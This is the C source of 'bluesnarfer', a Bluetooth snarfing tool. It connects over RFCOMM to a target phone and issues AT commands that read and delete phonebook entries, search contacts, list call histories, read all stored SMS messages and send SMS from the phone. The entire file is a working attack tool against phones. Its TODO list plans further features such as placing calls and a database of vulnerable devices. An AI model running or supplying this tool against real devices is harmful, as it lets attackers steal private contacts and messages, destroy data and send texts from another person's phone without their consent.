/*
        bluesnarfer ..
        bluetooth snarfing tool , there is also one mutch better than that,
   minicom :P

        Authors: Roberto Martelloni "boos", Davide Del Vecchio "Dante
   Alighieri".. Email : r.martelloni2003@libero.it, dante@alighieri.org ..

        



        TODO:
        - REWRITE ALL the code in a better way ..
        - add sms (mms?)
        - add call to number
        - add inquiry procedure
        - create a ncurses interface ?
        - create db of vulnerable device
        - sdp port scan

*/

#include <errno.h>
#include <getopt.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <termios.h>
#include <unistd.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/rfcomm.h>

#define VERSION "1.1"
#define DEFAULTPB "AT+CPBS=\"ME\"\r\n"
#define RFCOMMDEV "/dev/rfcomm"
#define MAX_BUFFER_SIZE 1024

struct opt {
    char *bd_addr;
    char *phonebook;
    char *custom_cmd;
    char *name;
    char *sms_number;
    char *sms_message;
    int act;
    int channel;
    int N_MIN;
    int N_MAX;
};

enum actions { CUSTOM = 1, READ, WRITE, SEARCH, LIST, INFO, SEND_SMS, READ_SMS };

int device = -1;
int ctl = -1;

void usage(char *bin);
void bt_rfcomm_rel();
FILE *bt_rfcomm_config();
FILE *bt_rfcomm(int sock, char *str_bdaddr, int channel);
int bluesnarfer(struct opt options);
void parse_rw(struct opt *options, char *toparse);
int switch_cmd(FILE *fd, struct opt options);
int custom_cmd(FILE *fd, char *cmd);
int rw_cmd(FILE *fd, struct opt options);
int search_cmd(FILE *fd, struct opt options);
int list_cmd(FILE *fd);
int info_cmd(FILE *fd);
int send_sms_cmd(FILE *fd, struct opt options);
int read_sms_cmd(FILE *fd);
char *rfcomm_read(FILE *fp, char *send);
char *parse(char *ptr);

int main(int ac, char **av) {
    struct opt options = {0};
    int opt;

    options.channel = 17;

    if (getuid() != 0) {
        fprintf(stderr, "bluesnarfer: you must be root\n");
        usage(av[0]);
    }

    while ((opt = getopt(ac, av, "C:b:c:r:w:f:s:ldihS:R:")) != -1) {
        switch (opt) {
        case 'b':
            options.bd_addr = optarg;
            break;
        case 'c':
            options.act = CUSTOM;
            options.custom_cmd = optarg;
            break;
        case 'C':
            options.channel = atoi(optarg);
            break;
        case 'r':
            options.act = READ;
            parse_rw(&options, optarg);
            break;
        case 'w':
            options.act = WRITE;
            parse_rw(&options, optarg);
            break;
        case 'f':
            options.act = SEARCH;
            options.name = optarg;
            break;
        case 's':
            options.phonebook = optarg;
            break;
        case 'l':
            options.act = LIST;
            break;
        case 'i':
            options.act = INFO;
            break;
        case 'S':
            options.act = SEND_SMS;
            options.sms_number = strtok(optarg, ":");
            options.sms_message = strtok(NULL, "");
            if (!options.sms_number || !options.sms_message) {
                fprintf(stderr, "bluesnarfer: invalid SMS format. Use -S <number>:<message>\n");
                usage(av[0]);
            }
            break;
        case 'R':
            options.act = READ_SMS;
            break;
        default:
            usage(av[0]);
        }
    }

    if (!options.bd_addr) {
        fprintf(stderr, "bluesnarfer: you must set bd_addr\n");
        usage(av[0]);
    }

    if (!options.act) {
        fprintf(stderr, "bluesnarfer: select an action\n");
        usage(av[0]);
    }

    return bluesnarfer(options);
}

void parse_rw(struct opt *options, char *toparse) {
    char *ptr = strchr(toparse, '-');
    if (ptr) {
        *ptr = '\0';
        options->N_MIN = atoi(toparse);
        options->N_MAX = atoi(ptr + 1);
    } else {
        options->N_MIN = options->N_MAX = atoi(toparse);
    }
}

void usage(char *bin) {
    fprintf(stderr,
            "bluesnarfer, version %s -\n"
            "usage: %s [options] [ATCMD] -b bt_addr\n\n"
            "ATCMD     : valid AT+CMD (GSM EXTENSION)\n"
            "TYPE      : valid phonebook type ..\n"
            "-b bdaddr : bluetooth device address\n"
            "-C chan   : bluetooth rfcomm channel\n"
            "-c ATCMD  : custom action\n"
            "-r N-M    : read phonebook entry N to M\n"
            "-w N-M    : delete phonebook entry N to M\n"
            "-f name   : search \"name\" in phonebook address\n"
            "-s TYPE   : select phonebook memory storage\n"
            "-l        : list available phonebook memory storage\n"
            "-i        : device info\n"
            "-S number:message : send SMS to number with message\n"
            "-R        : read SMS messages\n",
            VERSION, bin);
    exit(EXIT_FAILURE);
}

int bluesnarfer(struct opt options) {
    FILE *fd;

    signal(SIGINT, bt_rfcomm_rel);
    signal(SIGSEGV, bt_rfcomm_rel);

    if ((device = hci_get_route(NULL)) < 0) {
        fprintf(stderr, "bluesnarfer: hci_get_route failed: %s\n", strerror(errno));
        return EXIT_FAILURE;
    }

    if ((ctl = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_RFCOMM)) < 0) {
        fprintf(stderr, "bluesnarfer: Can't open RFCOMM control socket: %s\n", strerror(errno));
        return EXIT_FAILURE;
    }

    if (!(fd = bt_rfcomm(ctl, options.bd_addr, options.channel))) {
        fprintf(stderr, "bluesnarfer: unable to create RFCOMM connection\n");
        return EXIT_FAILURE;
    }

    if (switch_cmd(fd, options) < 0) {
        fprintf(stderr, "bluesnarfer: command execution failed\n");
        return EXIT_FAILURE;
    }

    bt_rfcomm_rel();
    return EXIT_SUCCESS;
}

void bt_rfcomm_rel() {
    struct rfcomm_dev_req req = {0};
    req.dev_id = device;

    if (ioctl(ctl, RFCOMMRELEASEDEV, &req) < 0) {
        fprintf(stderr, "bluesnarfer: unable to release RFCOMM: %s\n", strerror(errno));
    } else {
        printf("bluesnarfer: RFCOMM released successfully\n");
    }

    exit(EXIT_SUCCESS);
}

int bt_get_remote_name(char *str_bdaddr) {

        struct hci_conn_info_req cr;
        int dd, cc, handler;
        char name[248];
        bdaddr_t bdaddr;

        if ((dd = hci_open_dev(device)) < 0) {

                fprintf(stderr, "bluesnarfer: hci_open_dev : %s\n",
                        strerror(errno));
                return -1;
        }

        str2ba(str_bdaddr, &bdaddr);

        memcpy(&cr.bdaddr, &bdaddr, sizeof(bdaddr_t));
        cr.type = ACL_LINK;

        if (ioctl(dd, HCIGETCONNINFO, (unsigned long)&cr) < 0) {

                if ((cc = hci_create_connection(dd, &bdaddr,
                                                htobs(HCI_DM1 | HCI_DH1), 0, 0,
                                                (void *)&handler, 25000)) < 0) {

                        fprintf(stderr,
                                "bluesnarfer: hci_create_connection failed\n");
                        hci_close_dev(dd);

                        return -1;
                }
        }

        if (hci_read_remote_name(dd, &bdaddr, 248, name, 25000)) {

                fprintf(stderr, "bluesnarfer: hci_read_remote_name failed\n");

                hci_close_dev(dd);
                hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION,
                               10000);

                return -1;
        }

        printf("device name: %s\n", name);

        if (cc)
                hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION,
                               10000);

        hci_close_dev(dd);
        return 0;
}

char *rfcomm_read(FILE *fp, char *send) {

        int r, ret;
        char *line;

        long unsigned int line_size;

        line = 0x00;
        ret = line_size = 0;

        while (1) {

                r = getline(&line, &line_size, fp);

                line[r - 1] = 0;

                if (!strncmp(line, send, strlen(line)) && !ret) {

                        ret = 1;
                        continue;
                }

                if (strncmp(line, send, strlen(line)) && ret)
                        return line;
        }

        return 0x00;
}

FILE *bt_rfcomm(int sock, char *str_bdaddr, int channel) {

        struct rfcomm_dev_req req;
        int device, ctl;
        bdaddr_t bdaddr;
        FILE *fd;

        //fprintf(stderr, "calling hci_get_route(0x00)\n");
        if ((device = hci_get_route(0x00)) < 0) {

                fprintf(stderr, "bluesnarfer: hci_get_route local failed\n");
                return 0x00;
        }

        str2ba(str_bdaddr, &bdaddr);

        memset(&req, 0x00, sizeof(req));

        req.dev_id = device;
        req.channel = channel;

        memcpy(&req.src, BDADDR_ANY, sizeof(BDADDR_ANY));
        memcpy(&req.dst, &bdaddr, sizeof(bdaddr));

        //fprintf(stderr, "calling ioctl(sock, RFCOMMCREATEDEV, &req)\n");
        if (ioctl(sock, RFCOMMCREATEDEV, &req) < 0) {

                fprintf(stderr,
                        "bluesnarfer: ioctl RFCOMMCREATEDEV failed, %s\n",
                        strerror(errno));
                return 0x00;
        }

        //fprintf(stderr, "calling bt_rfcomm_config()\n");
        if (!(fd = bt_rfcomm_config())) {

                fprintf(stderr, "bluesnarfer: bt_rfcomm_config failed\n");
                return 0x00;
        }

        return fd;
}

FILE *bt_rfcomm_config() {

        char dev_device[1024];
        struct termios term;
        FILE *fd;
        int fdc;

        snprintf(dev_device, 1024, "%s%d", RFCOMMDEV, device);

        //fprintf(stderr, "opening %s\n", dev_device);
        if (!(fd = fopen(dev_device, "r+"))) {
                fprintf(stderr, "bluesnarfer: open %s, %s\n", dev_device,
                        strerror(errno));
                return 0x00;
        }

        fdc = fileno(fd);

        //fprintf(stderr, "calling tcgetattr(fdc, &term)\n");
        if (tcgetattr(fdc, &term) < 0) {

                fprintf(stderr, "bluesnarfer: tcgetattr failed, %s\n",
                        strerror(errno));
                return 0x00;
        }

        term.c_cflag = CS8 | CLOCAL | CREAD;
        term.c_iflag = ICRNL;
        term.c_oflag = 0;
        term.c_lflag = ICANON;

        tcsetattr(fdc, TCSANOW, &term);

        if ((cfsetispeed(&term, B230400) < 0) ||
            (cfsetospeed(&term, B230400) < 0)) {

                fprintf(stderr, "bluesnarfer: cfset(i/o)speed failed, %s\n",
                        strerror(errno));
                return 0x00;
        }

        return fd;
}

// i can do it better ..
int switch_cmd(FILE *fd, struct opt options) {
    int ret = 0;

    switch (options.act) {
    case READ:
        ret = rw_cmd(fd, options);
        break;
    case WRITE:
        ret = rw_cmd(fd, options);
        break;
    case SEARCH:
        ret = search_cmd(fd, options);
        break;
    case LIST:
        ret = list_cmd(fd);
        break;
    case INFO:
        ret = info_cmd(fd);
        break;
    case SEND_SMS:
        ret = send_sms_cmd(fd, options);
        break;
    case READ_SMS:
        ret = read_sms_cmd(fd);
        break;
    default:
        fprintf(stderr, "bluesnarfer: unknown action\n");
        ret = -1;
    }

    return ret;
}

// raw output ..
int custom_cmd(FILE *fd, char *cmd) {

        char buffer[128], *ptr;
        int r, bsize;

        if (!strstr(cmd, "AT")) {

                printf("bluesnarfer: invalid command inserted, you must insert "
                       "AT.*\n");
                return -1;
        }

        snprintf(buffer, 128, "%s\r\n", cmd);

        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite, %s", strerror(errno));
                return -1;
        }

        printf("custum cmd selected, raw output\n");

        if (!(ptr = rfcomm_read(fd, buffer))) {

                fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
                return -1;
        }

        printf("%s\n", ptr);

        return 0;
}

int rw_cmd(FILE *fd, struct opt options) {

        char buffer[32];
        char *ptr, *tptr;

        if (!options.phonebook) {

                fwrite(DEFAULTPB, strlen(DEFAULTPB), 1, fd);

                rfcomm_read(fd, DEFAULTPB);
        } else {

                printf("custom phonebook selected\n");
                snprintf(buffer, 32, "AT+CPBS=\"%s\"\r\n", options.phonebook);
                fwrite(buffer, strlen(buffer), 1, fd);

                rfcomm_read(fd, buffer);
        }

        do {

                if (options.act == READ)
                        snprintf(buffer, 32, "AT+CPBR=%d\r\n", options.N_MIN);

                else
                        snprintf(buffer, 32, "AT+CPBW=%d\r\n", options.N_MIN);

                if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                        fprintf(stderr, "bluesnarfer: write, %s",
                                strerror(errno));
                        return -1;
                }

                if (options.act == READ) {

                        if (!(ptr = rfcomm_read(fd, buffer))) {

                                fprintf(stderr,
                                        "bluesnarfer: rfcomm_read failed\n");
                                return -1;
                        }

                        if (tptr = parse(ptr)) {

                                printf("%s\n", tptr);
                                free(tptr);
                        }
                } else {

                        if (!rfcomm_read(fd, buffer)) {

                                fprintf(stderr,
                                        "bluesnarfer: rfcomm_read failed\n");
                                return -1;
                        }

                        printf("delete of entry %d successfull\n",
                               options.N_MIN);
                }

                options.N_MIN++;

        } while (options.N_MIN <= options.N_MAX);

        return 0;
}

char *parse(char *ptr) {

        char *pa, *tptr, *indx, *num, *name;

        pa = malloc(1024);
        memset(pa, 0x00, 1024);

        // indx number ..
        if (tptr = strchr(ptr, ':')) {

                indx = tptr + 1;
                tptr = strchr(ptr, ',');
                *tptr = 0;
                ptr = tptr + 1;

                if (!strlen(indx))
                        return 0x00;

                tptr = strchr(ptr, '"');
                num = tptr + 1;

                tptr = strchr(num, '"');
                *tptr = 0;

                ptr = tptr + 1;

                if (!strlen(ptr))
                        return 0x00;

                tptr = strchr(ptr, '"');
                name = tptr + 1;

                tptr = strchr(name, '"');
                *tptr = 0;

                snprintf(pa, 1024, "+ %s - %s : %s", indx, name, num);

                return pa;
        }

        return 0x00;
}

int search_cmd(FILE *fd, struct opt options) {

        char buffer[256], *ptr, *p;

        printf("start to search name: %s\n", options.name);

        if (options.phonebook)
                snprintf(buffer, 256, "AT+CPBS=\"%s\"\r\n", options.phonebook);
        else
                snprintf(buffer, 256, "AT+CPBS=\"ME\"\r\n");

        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }

        rfcomm_read(fd, buffer);

        snprintf(buffer, 256, "AT+CPBF=\"%s\"\r\n", options.name);
        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }

        if (!(ptr = rfcomm_read(fd, buffer))) {

                fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
                return -1;
        }

        if (!(p = parse(ptr)))
                printf("bluesnarfer: entry not found\n");
        else
                printf("%s\n", p);

        return 0;
}

int list_cmd(FILE *fd) {

        char buffer[] = "AT+CPBS=?\r\n";
        char *c, *ptr;
        char *phonebook[] = {"DC", "EN", "FD", "LD", "MC", "MT",
                             "ON", "RC", "SM", "TA", NULL};
        char *pbd[] = {" DC  - Dialled call list\n",
                       " EN  - Emergency number list\n",
                       " FD  - SIM fix dialing list\n",
                       " LD  - SIM last dialing list\n",
                       " MC  - ME missed call list\n",
                       " MT  - ME + SIM conbined list\n",
                       " ON  - SIM o ME own number list\n",
                       " RC  - ME received calls list\n",
                       " SM  - SIM phonebook list\n",
                       " TA  - TA phonebook list\n",
                       NULL};
        int i;
        c = 0x00;

        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }

        if (!(ptr = rfcomm_read(fd, buffer))) {
                fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
                return -1;
        }

        printf("phobebook list: \n");

        ptr = strchr(ptr, '(') + 1;

        while (c = strchr(ptr, ',')) {

                *c = 0;

                for (i = 0; phonebook[i]; i++) {
                        if (strstr(ptr, phonebook[i])) {
                                printf("%s", pbd[i]);

                                break;
                        }
                }

                if (!phonebook[i])
                        printf("%s - Unknow phonebook list\n", ptr);

                ptr = c + 1;
        }

        return 0;
}

int info_cmd(FILE *fd) {
        char buffer[128], *p;

        snprintf(buffer, 128, "AT+CGMI\r\n");
        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }
        p = rfcomm_read(fd, buffer);
        fprintf(stderr, "%s\n", p);

        snprintf(buffer, 128, "AT+CGMM\r\n");
        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }
        p = rfcomm_read(fd, buffer);
        fprintf(stderr, "%s\n", p);

        snprintf(buffer, 128, "AT+CGMR\r\n");
        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }
        p = rfcomm_read(fd, buffer);
        fprintf(stderr, "%s\n", p);

        return 0;
}

int send_sms_cmd(FILE *fd, struct opt options) {
    char buffer[256];

    // Set SMS mode to text
    snprintf(buffer, sizeof(buffer), "AT+CMGF=1\r\n");
    if (!fwrite(buffer, strlen(buffer), 1, fd)) {
        fprintf(stderr, "bluesnarfer: failed to set SMS mode\n");
        return -1;
    }
    rfcomm_read(fd, buffer);

    // Send SMS
    snprintf(buffer, sizeof(buffer), "AT+CMGS=\"%s\"\r\n", options.sms_number);
    if (!fwrite(buffer, strlen(buffer), 1, fd)) {
        fprintf(stderr, "bluesnarfer: failed to initiate SMS sending\n");
        return -1;
    }
    rfcomm_read(fd, buffer);

    // Write the message and terminate with Ctrl+Z
    snprintf(buffer, sizeof(buffer), "%s\x1A", options.sms_message);
    if (!fwrite(buffer, strlen(buffer), 1, fd)) {
        fprintf(stderr, "bluesnarfer: failed to send SMS message\n");
        return -1;
    }
    rfcomm_read(fd, buffer);

    printf("SMS sent successfully to %s\n", options.sms_number);
    return 0;
}

int read_sms_cmd(FILE *fd) {
    char buffer[256];

    // Set SMS mode to text
    snprintf(buffer, sizeof(buffer), "AT+CMGF=1\r\n");
    if (!fwrite(buffer, strlen(buffer), 1, fd)) {
        fprintf(stderr, "bluesnarfer: failed to set SMS mode\n");
        return -1;
    }
    rfcomm_read(fd, buffer);

    // List all SMS messages
    snprintf(buffer, sizeof(buffer), "AT+CMGL=\"ALL\"\r\n");
    if (!fwrite(buffer, strlen(buffer), 1, fd)) {
        fprintf(stderr, "bluesnarfer: failed to list SMS messages\n");
        return -1;
    }

    char *response = rfcomm_read(fd, buffer);
    if (response) {
        printf("SMS Messages:\n%s\n", response);
    } else {
        fprintf(stderr, "bluesnarfer: failed to read SMS messages\n");
        return -1;
    }

    return 0;
}
